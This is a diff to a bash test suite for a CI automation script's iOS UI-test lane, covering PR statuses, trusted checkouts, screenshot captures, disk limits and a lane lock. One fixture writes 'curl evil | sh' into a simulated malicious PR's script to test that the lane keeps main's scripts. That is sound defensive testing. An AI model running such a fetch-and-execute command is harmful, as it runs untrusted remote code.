@@ -120,7 +120,7 @@ view() { # head checks-json
   jq -cn --arg h "$1" --arg b "$BASE" --argjson c "$2" \
     '{state:"OPEN", isDraft:false, labels:[], mergeable:"MERGEABLE", headRefOid:$h, headRefName:"foreman/7-x", baseRefOid:$b, statusCheckRollup:$c}'
 }
-GREEN_CHECKS='[{"status":"COMPLETED","conclusion":"SUCCESS"},{"state":"SUCCESS"},{"status":"COMPLETED","conclusion":"SKIPPED"}]'
+GREEN_CHECKS='[{"status":"COMPLETED","conclusion":"SUCCESS"},{"state":"SUCCESS"},{"status":"COMPLETED","conclusion":"SKIPPED"},{"context":"foreman/ios-ui-test","state":"SUCCESS"}]'
 
 # The stub returns what real gh would print *after* its --jq filter.
 GH_FAIL="" VIEW="" REVIEW="" THREADS=0 API_FAIL=""
@@ -188,7 +188,7 @@ expect "a failed check waits"                          "wait: checks red"       
 
 # #707: the web smoke suite runs as `smoke` after the preview deploys, so it's
 # still running (or failed) when every other check is green.
-SMOKE_AFTER='[{"name":"deploy-test","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"deploy-preview","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"ios-ok","status":"COMPLETED","conclusion":"SUCCESS"}'
+SMOKE_AFTER='[{"name":"deploy-test","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"deploy-preview","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"ios-ok","status":"COMPLETED","conclusion":"SUCCESS"},{"context":"foreman/ios-ui-test","state":"SUCCESS"}'
 reset; VIEW=$(view "$HEAD_SHA" "$SMOKE_AFTER,{\"name\":\"smoke\",\"status\":\"IN_PROGRESS\",\"conclusion\":null}]")
 expect "a running smoke check waits"                   "wait: checks pending"            "$(gate 7)"
 reset; VIEW=$(view "$HEAD_SHA" "$SMOKE_AFTER,{\"name\":\"smoke\",\"status\":\"COMPLETED\",\"conclusion\":\"FAILURE\"}]")
@@ -201,6 +201,21 @@ expect "a skipped smoke check (no preview) merges"     "merge $HEAD_SHA"        
 
 reset; VIEW=$(view "$HEAD_SHA" '[]')
 expect "no checks at all waits"                      "wait: checks none"               "$(gate 7)"
+
+# #611: the Mac mini's UI tests. Until the foreman posts the status, it isn't
+# in the rollup at all, and everything else can be green.
+NO_UI_TEST='[{"status":"COMPLETED","conclusion":"SUCCESS"},{"context":"ci/other","state":"SUCCESS"}]'
+reset; VIEW=$(view "$HEAD_SHA" "$NO_UI_TEST")
+expect "a head without foreman/ios-ui-test waits"      "wait: ios-ui-test not posted"    "$(gate 7)"
+reset; VIEW=$(view "$HEAD_SHA" '[{"status":"COMPLETED","conclusion":"SUCCESS"},{"context":"foreman/ios-ui-test","state":"PENDING"}]')
+expect "a running one waits as pending"                "wait: checks pending"            "$(gate 7)"
+reset; VIEW=$(view "$HEAD_SHA" '[{"status":"COMPLETED","conclusion":"SUCCESS"},{"context":"foreman/ios-ui-test","state":"FAILURE"}]')
+expect "a failed one is red"                           "wait: checks red"                "$(gate 7)"
+mkdir -p "$IOS"; echo "8GB free, under the 10GB an iOS job needs" > "$IOS/low-disk"
+reset; VIEW=$(view "$HEAD_SHA" "$NO_UI_TEST")
+expect "low on disk, the wait says why"                "wait: ios-ui-test not posted (the Mac mini's iOS lane is stopped: 8GB free, under the 10GB an iOS job needs)" "$(gate 7)"
+expect "and the stall clock keys on the same wait"     "$(wait_key "ios-ui-test not posted")" "$(wait_key "ios-ui-test not posted (the Mac mini's iOS lane is stopped: 8GB free)")"
+rm -f "$IOS/low-disk"
 
 reset; THREADS=2
 expect_prefix "the owner's open threads wait"          "wait: 2 unresolved"              "$(gate 7)"
@@ -1921,6 +1936,285 @@ expect "and the edit follows" "issue edit 70 --add-label waiting-on-owner" "$(ed
 : > "$CALLS"; W_LABELS='[{"name":"waiting-on-owner"}]'
 waiting_pass "$W_BOARD" >/dev/null
 expect "only once" "no no" "$(called 'label create') $(called 'label list')"
+
+# ---- the iOS lane (#611) -----------------------------------------------------
+
+echo "the iOS lane"
+eval "real_$(declare -f lane_busy)"
+
+CALLS="$tmp/calls"; : > "$CALLS"
+alert() { echo "alert $*" >> "$CALLS"; }
+event() { echo "event $*" >> "$CALLS"; }
+routine_event() { echo "routine_event $*" >> "$CALLS"; }
+log() { echo "log $*" >> "$CALLS"; }
+called() { grep -qF -- "$1" "$CALLS" && echo yes || echo no; }
+statuses() { grep -oE 'statuses/[a-z0-9]+ -f state=[a-z]+ -f context=foreman/ios-ui-test -f description=.*' "$CALLS" | sed -E 's#statuses/##; s/ -f context=foreman\/ios-ui-test//; s/ -f (state|description)=/ /g' | paste -sd'|' -; }
+mkdir -p "$IOS" "$LOGS" "$WORKTREES"
+
+yn() { "$@" && echo yes || echo no; }
+expect "a web-only change doesn't touch the app"    no  "$(yn touches_ios <<<$'src/web/app.ts\nREADME.md')"
+expect "src/ios does"                                yes "$(yn touches_ios <<<$'src/web/app.ts\nsrc/ios/Nylon Impossible/App.swift')"
+expect "so do the design tokens"                     yes "$(yn touches_ios <<<'src/shared/design/tokens.json')"
+expect "and the typed-date fixtures"                 yes "$(yn touches_ios <<<'src/shared/src/todo-date-fixtures.json')"
+expect "but not the rest of src/shared"              no  "$(yn touches_ios <<<$'src/shared/src/seed-account.ts\nsrc/shared/designer.ts\nsrc/iosx/a')"
+expect "nor ios-test.yml, which ios-ok covers"       no  "$(yn touches_ios <<<'.github/workflows/ios-test.yml')"
+
+# The status pass: every open PR, against its file list.
+ctx() { jq -cn --arg s "$1" '[{context:"foreman/ios-ui-test", state:$s}]'; }
+pr_json() { # number author draft fork rollup
+  jq -cn --argjson n "$1" --arg a "$2" --argjson d "$3" --argjson f "$4" --argjson r "$5" \
+    '{number:$n, headRefOid:("sha" + ($n|tostring)), author:{login:$a}, isDraft:$d, isCrossRepository:$f, statusCheckRollup:$r}'
+}
+PRS="[$(pr_json 16 stranger false true '[]'),$(pr_json 11 nylon-foreman false false '[]'),$(pr_json 10 superhighfives false false '[]'),
+  $(pr_json 12 superhighfives false true '[]'),$(pr_json 13 app/dependabot false false '[]'),$(pr_json 14 superhighfives true false '[]'),
+  $(pr_json 15 superhighfives false false "$(ctx SUCCESS)"),$(pr_json 9 superhighfives false false "$(ctx PENDING)"),
+  $(pr_json 17 nylon-foreman false false "$(ctx FAILURE)")]"
+files_of() {
+  case "$1" in
+    10|16) echo src/web/app.ts ;;
+    13)    printf '%s\n' package.json src/shared/design/tokens.json ;;
+    11)    printf '%s\n' src/web/app.ts src/shared/src/todo-date-fixtures.json ;;
+    *)     echo "src/ios/Nylon Impossible/App.swift" ;;
+  esac
+}
+FILES_FAIL=""
+gh() {
+  echo "gh $*" >> "$CALLS"
+  case "$1 $2" in
+    "pr list") echo "$PRS" ;;
+    "api repos/superhighfives/nylon-impossible/pulls/"*)
+      local n="${2#repos/superhighfives/nylon-impossible/pulls/}"; n="${n%/files}"
+      [ "$n" != "$FILES_FAIL" ] || return 1; files_of "$n" ;;
+    "api repos/superhighfives/nylon-impossible/statuses/"*) return 0 ;;
+    *) return 0 ;;
+  esac
+}
+: > "$CALLS"; ios_status_pass ""
+expect "no iOS change: success at once, forks and strangers too; an untrusted iOS change: failure" \
+  "sha10 success No iOS change|sha12 failure $NOT_RUN|sha13 failure $NOT_RUN|sha16 success No iOS change" "$(statuses)"
+expect "trusted iOS PRs queue, oldest first, a draft waits, and a final status is left alone" \
+  "9 sha9 pending|11 sha11 none" "$(tr '\t' ' ' <<<"$IOS_QUEUE" | grep . | paste -sd'|' -)"
+expect "a head that has its status isn't read again" "no no" "$(called 'pulls/15/files') $(called 'pulls/17/files')"
+expect "a description fits GitHub's 140 characters" yes "$([ "${#NOT_RUN}" -le 140 ] && echo yes)"
+
+: > "$CALLS"; FILES_FAIL=10; ios_status_pass ""
+expect "a file list that can't be read posts nothing for that PR" no "$(called 'statuses/sha10')"
+FILES_FAIL=""
+: > "$CALLS"; ios_status_pass "deps, ui-test"
+expect "ui-test off: no statuses, nothing queued" "|" "$(statuses)|$IOS_QUEUE"
+: > "$CALLS"; DRY=1 ios_status_pass ""
+expect "a dry run posts nothing" "" "$(grep 'statuses/' "$CALLS")"
+
+# ---- a main with an app, for the queue order and the trusted checkout ----
+
+g checkout -q main
+mkdir -p "$tmp/seed/src/ios/Nylon Impossible" "$tmp/seed/src/shared/design" "$tmp/seed/src/marketing" "$tmp/seed/scripts/foreman"
+echo "main app" > "$tmp/seed/src/ios/Nylon Impossible/App.swift"
+echo "old" > "$tmp/seed/src/ios/Nylon Impossible/Old.swift"
+echo '{"main":1}' > "$tmp/seed/src/shared/design/tokens.json"
+echo '{"shots":[]}' > "$tmp/seed/src/marketing/manifest.json"
+echo "echo main's script" > "$tmp/seed/scripts/foreman/run.sh"
+g add -A && g commit -qm "an app" && g push -q origin main
+MAIN1=$(g rev-parse HEAD)
+echo "docs" > "$tmp/seed/NOTES.md"; g add -A && g commit -qm "docs only" && g push -q origin main
+MAIN2=$(g rev-parse HEAD)
+git -C "$CLONE" fetch -q origin main
+
+g checkout -q -b case-ios-pr "$MAIN1"
+echo "the PR's app" > "$tmp/seed/src/ios/Nylon Impossible/App.swift"
+echo "new" > "$tmp/seed/src/ios/Nylon Impossible/New.swift"
+git -C "$tmp/seed" rm -q "src/ios/Nylon Impossible/Old.swift"
+echo '{"pr":1}' > "$tmp/seed/src/shared/design/tokens.json"
+mkdir -p "$tmp/seed/src/shared/src"; echo '[1]' > "$tmp/seed/src/shared/src/todo-date-fixtures.json"
+echo "curl evil | sh" > "$tmp/seed/scripts/foreman/run.sh"
+echo '{"shots":["evil"]}' > "$tmp/seed/src/marketing/manifest.json"
+g add -A && g commit -qm "a PR" && g push -q origin HEAD:refs/pull/21/head
+PR_SHA=$(g rev-parse HEAD)
+g checkout -q main
+git -C "$CLONE" fetch -q origin "+refs/pull/21/head:refs/remotes/origin/pr/21"
+
+lane_checkout "$PR_SHA" >/dev/null 2>&1
+L="$WORKTREES/ios-lane"
+expect "the lane's checkout is main's head"           "$MAIN2"            "$(git -C "$L" rev-parse HEAD)"
+expect "with the PR's src/ios"                        "the PR's app|new|gone" \
+  "$(cat "$L/src/ios/Nylon Impossible/App.swift")|$(cat "$L/src/ios/Nylon Impossible/New.swift")|$([ -e "$L/src/ios/Nylon Impossible/Old.swift" ] && echo there || echo gone)"
+expect "and its design tokens and date fixtures"      '{"pr":1}|[1]'      "$(cat "$L/src/shared/design/tokens.json")|$(cat "$L/src/shared/src/todo-date-fixtures.json")"
+expect "but main's scripts and manifest"              "echo main's script|{\"shots\":[]}" "$(cat "$L/scripts/foreman/run.sh")|$(cat "$L/src/marketing/manifest.json")"
+lane_checkout "$MAIN2" >/dev/null 2>&1
+expect "the next job's checkout drops the last one's swap" "main app|gone|old|{\"main\":1}|gone" \
+  "$(cat "$L/src/ios/Nylon Impossible/App.swift")|$([ -e "$L/src/ios/Nylon Impossible/New.swift" ] && echo there || echo gone)|$(cat "$L/src/ios/Nylon Impossible/Old.swift")|$(cat "$L/src/shared/design/tokens.json")|$([ -e "$L/src/shared/src/todo-date-fixtures.json" ] && echo there || echo gone)"
+expect "and the worktree is kept between jobs" no "$(cleanup_worktrees >/dev/null 2>&1; [ -d "$L" ] && echo no || echo yes)"
+
+# The order: PR heads, then main after a merge, then the captures.
+rm -f "$IOS/ui-test-main" "$IOS/captured"
+IOS_QUEUE=$'9\tsha9\tpending\n11\tsha11\tnone\n'
+ios_next "$MAIN1" ""; expect "PR heads first, oldest first"           "ui-test sha9 9"      "$IOS_NEXT"
+IOS_QUEUE=""
+ios_next "$MAIN1" ""; expect "then main, which hasn't run"             "ui-test $MAIN1 main" "$IOS_NEXT"
+printf '%s\n%s\n' "$MAIN1" "$(ios_revision "$MAIN1" ios)" > "$IOS/ui-test-main"
+ios_next "$MAIN1" ""; expect "then the captures"                       "captures $MAIN1"     "$IOS_NEXT"
+ios_revision "$MAIN1" capture > "$IOS/captured"
+ios_next "$MAIN1" ""; expect "then nothing"                            ""                    "$IOS_NEXT"
+: > "$CALLS"; ios_next "$MAIN2" ""
+expect "a merge that left the app alone: main's status without a build" "$MAIN2 success No iOS change since ${MAIN1:0:7}|" "$(statuses)|$IOS_NEXT"
+expect "and it's remembered"                                            "$MAIN2"              "$(sed -n 1p "$IOS/ui-test-main")"
+expect "the capture revision is the iOS paths' and the manifest's ids" \
+  "src/ios src/marketing/manifest.json src/shared/design src/shared/src/todo-date-fixtures.json -" \
+  "$(ios_revision "$MAIN1" capture | jq -r 'keys | join(" ")') $(ios_revision "$MAIN1" capture | jq -r '.["src/shared/src/todo-date-fixtures.json"]')"
+rm -f "$IOS/captured" "$IOS/ui-test-main"
+IOS_QUEUE=$'11\tsha11\tnone\n'
+ios_next "$MAIN1" "ui-test"; expect "ui-test off: straight to the captures" "captures $MAIN1" "$IOS_NEXT"
+ios_next "$MAIN1" "ui-test,captures"; expect "both off: nothing"            ""                "$IOS_NEXT"
+IOS_QUEUE=""
+
+# A superseded head never runs.
+: > "$CALLS"
+gh() { echo "gh $*" >> "$CALLS"; case "$1 $2" in "pr view") echo "sha-newer" ;; *) return 0 ;; esac; }
+ui_test_job sha11 11
+expect "a PR that moved on isn't tested, and gets no status" "no no" "$(called 'statuses/') $(called 'worktree')"
+
+# A checkout that fails leaves the head pending, which the queue picks up again.
+: > "$CALLS"
+gh() { echo "gh $*" >> "$CALLS"; return 0; }
+eval "$(declare -f lane_checkout | sed '1s/^/real_/')"
+lane_checkout() { return 1; }
+ui_test_job sha12 main
+expect "a failed checkout stays pending, for the next tick" "sha12 pending Couldn't check it out on the Mac mini; the next tick tries again" "$(statuses)"
+expect "and its head is queued again" $'12\tsha12\trun\tpending' \
+  "$(ui_test_candidates <<<'[{"number":12,"headRefOid":"sha12","author":{"login":"nylon-foreman"},"isDraft":false,"isCrossRepository":false,"statusCheckRollup":[{"context":"foreman/ios-ui-test","state":"PENDING"}]}]')"
+eval "$(declare -f real_lane_checkout | sed '1s/^real_//')"
+
+# Xcode and the capture scripts are the commit's code: they never see the token.
+expect "the UI tests, captures and fix-shots run without the token" 3 "$(grep -c 'env -u GH_TOKEN -u GITHUB_TOKEN' "$here/foreman.sh")"
+
+# The status's words, from xcresulttool's summary.json.
+verdict() { ui_test_verdict "$1" <<<"$2" | tr '\t' '|'; }
+expect "all passed"  "success|All 42 passed" "$(verdict 0 '{"result":"Passed","passedTests":42,"failedTests":0,"skippedTests":0,"testFailures":[]}')"
+expect "passed, one on retry" "success|Passed, 1 on retry: testDoneUnderLoad" \
+  "$(verdict 0 '{"result":"Passed","passedTests":42,"failedTests":0,"testFailures":[{"testName":"testDoneUnderLoad()","testIdentifierString":"DoneAndScrollingUITests/testDoneUnderLoad()","failureText":"x"}]}')"
+expect "two failed, each named once" "failure|2 failed: testDoneUnderLoad, testDoneHoldsInPlaceThenLeavesWithUndo" \
+  "$(verdict 65 '{"result":"Failed","passedTests":40,"failedTests":2,"testFailures":[{"testName":"testDoneUnderLoad()","failureText":"a"},{"testName":"testDoneUnderLoad()","failureText":"b"},{"testIdentifierString":"DoneAndScrollingUITests/testDoneHoldsInPlaceThenLeavesWithUndo()","failureText":"c"}]}')"
+expect "a skip on the mini is said out loud" "success|40 passed, 2 skipped" "$(verdict 0 '{"result":"Passed","passedTests":40,"skippedTests":2,"testFailures":[]}')"
+many=$(jq -cn '{result:"Failed", failedTests:12, testFailures:[range(12) | {testName:"testAccessibilityAuditOfTheRoute\(.)()"}]}')
+long=$(ui_test_verdict 65 <<<"$many" | cut -f2)
+cut_short() { case "$1" in "12 failed: testAccessibilityAuditOfTheRoute0, "*", …") echo yes ;; *) echo "no: $1" ;; esac; }
+expect "a long list fits 140 characters, and says it's cut" "yes yes" \
+  "$([ "$(jq -rn --arg s "$long" '$s | length')" -le 140 ] && echo yes) $(cut_short "$long")"
+expect_prefix "no results: a failure that says so" "failure|No test results (xcodebuild exit 65)" "$(verdict 65 '')"
+expect "a time-out says so"                         "failure|Timed out after 45 minutes"       "$(verdict 142 '{"result":"Passed","passedTests":1}')"
+
+# ---- the captures ----
+
+PUSHED() { git -C "$tmp/origin.git" rev-parse -q --verify refs/heads/marketing-ios 2>/dev/null || echo none; }
+CAPTURE=fresh CAPTURE_EXIT=0
+run_capture() { # writes what generate.ts would, per $CAPTURE
+  local out="$1/src/marketing/source"
+  echo "run_capture $(git -C "$1" rev-parse HEAD) $(cat "$1/src/ios/Nylon Impossible/App.swift")" >> "$CALLS"
+  echo "png $RANDOM" > "$out/ios-iphone-today-light.png"; echo png > "$out/parity/ios-composer-dark.png"
+  jq -n --arg c "$CAPTURE" '{"ios-iphone-today-light": "fresh", "parity/ios-composer-dark": $c}' > "$out/capture-status.json"
+  return "$CAPTURE_EXIT"
+}
+gh() { echo "gh $*" >> "$CALLS"; return 0; }
+: > "$CALLS"; rm -f "$IOS/capture-failures" "$IOS/captured"
+captures_job "$MAIN1"
+first=$(PUSHED)
+expect "a good capture is pushed to marketing-ios" yes "$([ "$first" != none ] && echo yes)"
+expect "as one commit, with no parent, holding the shots, their status and revision" \
+  "capture-status.json revision.json source/ios-iphone-today-light.png source/parity/ios-composer-dark.png|1" \
+  "$(git -C "$tmp/origin.git" ls-tree -r --name-only marketing-ios | paste -sd' ' -)|$(git -C "$tmp/origin.git" rev-list --count marketing-ios)"
+expect "revision.json names the commit and its tree ids" "$MAIN1 yes" \
+  "$(git -C "$tmp/origin.git" show marketing-ios:revision.json | jq -r .sha) $([ "$(git -C "$tmp/origin.git" show marketing-ios:revision.json | jq -S -c .trees)" = "$(ios_revision "$MAIN1" capture)" ] && echo yes)"
+expect "then marketing.yml is dispatched, lenient" yes "$(called 'gh workflow run marketing.yml -R superhighfives/nylon-impossible --ref main -f strict=false')"
+expect "it captured main's checkout of that commit" "run_capture $MAIN2 main app" "$(grep run_capture "$CALLS")"
+expect "and the revision is remembered" "$(ios_revision "$MAIN1" capture)" "$(cat "$IOS/captured")"
+captures_job "$MAIN1"
+expect "the next push replaces it: still one commit" "yes 1" \
+  "$([ "$(PUSHED)" != "$first" ] && echo yes) $(git -C "$tmp/origin.git" rev-list --count marketing-ios)"
+
+: > "$CALLS"; before=$(PUSHED); CAPTURE=cached
+captures_job "$MAIN1"
+expect "a capture that reused a shot pushes nothing" "$before" "$(PUSHED)"
+expect "but marketing.yml is still dispatched, to publish the last good set" yes "$(called 'gh workflow run marketing.yml')"
+expect "it's a failed captures event, and one isn't an alert" "yes no" "$(called 'routine_event captures failed') $(called 'alert ')"
+: > "$CALLS"; CAPTURE_EXIT=142
+captures_job "$MAIN1"
+expect "two in a row is an alert" yes "$(called 'alert the iOS marketing captures failed 2 times in a row')"
+expect "a time-out says so" yes "$(called 'timed out after 45 minutes')"
+expect "nothing pushed" "$before" "$(PUSHED)"
+: > "$CALLS"; CAPTURE=fresh CAPTURE_EXIT=0
+captures_job "$MAIN1"
+expect "a good one ends the streak" "no ok" "$([ -e "$IOS/capture-failures" ] && echo yes || echo no) $(grep -oE 'routine_event captures [a-z]+' "$CALLS" | awk '{print $3}')"
+
+# ---- disk ----
+
+DU_KB="ui-test=$((9 * 1048576)) marketing=$((5 * 1048576)) fix-shots-ios=$((4 * 1048576)) fix-shots-mac=$((1 * 1048576))"
+du() { local p="${*: -1}" kv; for kv in $DU_KB; do [ "${p##*/}" != "${kv%%=*}" ] || printf '%s\t%s\n' "${kv#*=}" "$p"; done; }
+rm -rf "$DERIVED"; mkdir -p "$DERIVED"/{ui-test,marketing,fix-shots-ios,fix-shots-mac}
+touch -t 202611010100 "$DERIVED/fix-shots-mac"; touch -t 202611010200 "$DERIVED/fix-shots-ios"
+touch -t 202611010300 "$DERIVED/marketing";     touch -t 202611010400 "$DERIVED/ui-test"
+derived_now() { (cd "$DERIVED" && printf '%s\n' *) | sort | paste -sd' ' -; }
+derived_prune
+expect "over 15GB (19): the least recently used go first, until it's under" "marketing ui-test" "$(derived_now)"
+derived_prune
+expect "under the cap, nothing more goes" "marketing ui-test" "$(derived_now)"
+# shellcheck disable=SC2012 # the folder names are fixed
+expect "a job's folder is marked used when it starts" "$DERIVED/fix-shots-ios yes" \
+  "$(derived_for fix-shots-ios) $([ "$(ls -1t "$DERIVED" | head -1)" = fix-shots-ios ] && echo yes)"
+unset -f du
+
+FREE_KB=$((8 * 1048576))
+df() { printf 'Filesystem 1024-blocks Used Available Capacity Mounted\n/dev/disk3s5 1 1 %s 96%% /\n' "$FREE_KB"; }
+start_ios_job() { echo "start_ios_job $*" >> "$CALLS"; }
+lane_busy() { return 1; }
+rm -rf "$ONCE"; : > "$CALLS"; rm -f "$IOS/ui-test-main" "$IOS/captured"
+ios_pass ""
+expect "under 10GB free, nothing starts" no "$(called start_ios_job)"
+expect "the owner hears once, with an ios_skipped event" "yes yes" "$(called 'alert the iOS lane is stopped: the Mac mini has 8GB free') $(called 'event ios_skipped')"
+expect "and the gate can say why" "8GB free, under the 10GB an iOS job needs" "$(cat "$IOS/low-disk")"
+: > "$CALLS"; ios_pass ""
+expect "once a day" "no no" "$(called alert) $(called 'event ')"
+FREE_KB=$((20 * 1048576)); : > "$CALLS"
+ios_pass ""
+expect "with room, main's UI tests start" "start_ios_job ui-test $MAIN2 main" "$(grep start_ios_job "$CALLS")"
+expect "and the gate's note goes" no "$([ -e "$IOS/low-disk" ] && echo yes || echo no)"
+lane_busy() { return 0; }; : > "$CALLS"
+ios_pass ""
+expect "a busy lane starts nothing" no "$(called start_ios_job)"
+unset -f df
+
+# ---- the lock ----
+
+eval "$(declare -f real_lane_busy | sed '1s/^real_//')"
+sleep 30 & other=$!
+rm -rf "$LANE"; mkdir -p "$LANE"; echo "$other" > "$LANE/pid"
+expect "a live process holds the lane" yes "$(yn lane_busy)"
+expect "and it isn't a build: it doesn't count toward the job limit" "" "$(running_jobs)"
+LANE_WAIT=0 LANE_POLL=0
+expect "a wait for it gives up" no "$(yn lane_wait shots 0)"
+gh() { echo "gh $*" >> "$CALLS"; case "$1 $2" in "pr view") echo "## Try it" ;; *) return 0 ;; esac; }
+echo '{"shots":[{"device":"iphone","screen":"today"}]}' > "$tmp/plan.json"
+: > "$CALLS"; FREE_KB=""; fix_shots 31 30 foreman/30-x "$tmp/plan.json"
+expect "fix-shots gives up best-effort, and says so in Try it" yes "$(called "Not taken: the Mac mini's iOS lane was busy")"
+kill "$other" 2>/dev/null; wait "$other" 2>/dev/null
+expect "a lock whose process has gone is cleared" "no gone" "$(yn lane_busy) $([ -d "$LANE" ] && echo there || echo gone)"
+expect "and the lane can be taken, and let go" "yes $$ gone" "$(yn lane_take x) $(cat "$LANE/pid") $(lane_release; [ -d "$LANE" ] && echo there || echo gone)"
+
+# fix-shots keeps its DerivedData in ~/.foreman/derived, never /tmp.
+# shellcheck disable=SC2016 # the source text, unexpanded
+expect "fix-shots' DerivedData is under ~/.foreman/derived" "yes yes" \
+  "$(grep -q 'FIX_SHOTS_DERIVED_DATA_IOS="$(derived_for fix-shots-ios)"' "$here/foreman.sh" && echo yes) $(grep -q 'MARKETING_DERIVED_DATA="$(derived_for marketing)"' "$here/foreman.sh" && echo yes)"
+
+# The digest.
+EVENTS="$tmp/lane-events.jsonl"; : > "$EVENTS"
+eval "$(declare -f real_event | sed 's/^real_event/event/')"
+routine_event() { jq -cn --arg r "$1" --arg o "$2" --arg n "${3:-}" '{ts:"2026-11-01T07:00:00Z", event:"routine", routine:$r, outcome:$o, note:$n}' >> "$EVENTS"; }
+routine_event ui-test retry "main at abc1234: Passed, 1 on retry: testDoneUnderLoad"
+routine_event ui-test failed "main at abc1234: 2 failed: testDoneUnderLoad, testX"
+routine_event captures failed "abc1234: not every shot was captured (exit 1)"
+stalled_prs() { :; }
+expect "the digest lists the lane's problems" \
+  "- The iOS UI tests passed on main at abc1234: 1 on retry: testDoneUnderLoad|- The iOS UI tests failed on main at abc1234: 2 failed: testDoneUnderLoad, testX|- The iOS marketing captures failed (abc1234: not every shot was captured (exit 1)); marketing.yml used the last good set" \
+  "$(digest_problems "$(( FOREMAN_NOW - 86400 ))" | paste -sd'|' -)"
 
 echo
 echo "$pass passed, $fail failed"
